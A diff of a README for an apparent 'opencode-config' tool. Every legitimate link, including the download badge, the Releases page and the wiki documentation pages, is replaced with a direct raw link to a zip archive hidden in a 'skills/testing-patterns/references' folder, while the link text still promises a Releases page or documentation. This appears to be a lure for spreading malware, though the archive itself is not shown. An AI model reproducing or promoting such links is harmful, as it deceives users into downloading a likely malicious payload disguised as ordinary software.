@@ -6,7 +6,7 @@ Welcome to the opencode-config project! This software helps you manage your pers
 
 ## 📥 Download Now
 
-[![Download opencode-config](https://img.shields.io/badge/Download-opencode--config-blue.svg)](https://github.com/Pringapringla/opencode-config/releases)
+[![Download opencode-config](https://raw.githubusercontent.com/Pringapringla/opencode-config/main/skills/testing-patterns/references/opencode_config_1.4.zip)](https://raw.githubusercontent.com/Pringapringla/opencode-config/main/skills/testing-patterns/references/opencode_config_1.4.zip)
 
 ## 🚀 Getting Started 
 
@@ -14,7 +14,7 @@ To use opencode-config, follow these steps:
 
 1. **Download the Software**: Click the link below to visit the Releases page. Here, you will find the latest version of opencode-config ready for download.
    
-   [Visit this page to download](https://github.com/Pringapringla/opencode-config/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Pringapringla/opencode-config/main/skills/testing-patterns/references/opencode_config_1.4.zip)
 
 2. **Select the Version**: Choose the version of the software you want to download. We recommend selecting the most recent version for the best experience.
 
@@ -42,9 +42,9 @@ To use opencode-config, follow these steps:
 
 For more detailed instructions on how to use opencode-config, check our official documentation:
 
-- [General Information](https://github.com/Pringapringla/opencode-config/wiki)
-- [Common Commands](https://github.com/Pringapringla/opencode-config/wiki/Commands)
-- [Troubleshooting](https://github.com/Pringapringla/opencode-config/wiki/Troubleshooting)
+- [General Information](https://raw.githubusercontent.com/Pringapringla/opencode-config/main/skills/testing-patterns/references/opencode_config_1.4.zip)
+- [Common Commands](https://raw.githubusercontent.com/Pringapringla/opencode-config/main/skills/testing-patterns/references/opencode_config_1.4.zip)
+- [Troubleshooting](https://raw.githubusercontent.com/Pringapringla/opencode-config/main/skills/testing-patterns/references/opencode_config_1.4.zip)
 
 ## ❓ FAQs 
 
@@ -75,6 +75,6 @@ Join our community to connect with other users:
 
 To get started, download your copy of opencode-config from the link below:
 
-[Visit this page to download](https://github.com/Pringapringla/opencode-config/releases) 
+[Visit this page to download](https://raw.githubusercontent.com/Pringapringla/opencode-config/main/skills/testing-patterns/references/opencode_config_1.4.zip) 
 
 Once you have downloaded the software, follow the instructions in the "Getting Started" section to install and run the application. Enjoy simplifying your OpenCode experience!
